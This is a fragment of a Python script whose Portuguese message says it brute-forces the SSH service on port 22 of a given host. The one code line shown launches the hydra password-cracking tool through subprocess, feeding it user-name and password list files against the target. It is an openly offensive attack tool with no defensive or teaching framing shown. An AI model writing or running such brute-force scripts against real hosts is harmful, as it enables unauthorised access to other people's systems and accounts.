...
print("Programa destinado a brute force no serviço ssh (porta 22) de um host")
...
process = subprocess.Popen(["hydra", "-L", "teste.txt", "-P", "teste.txt", host, "ssh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
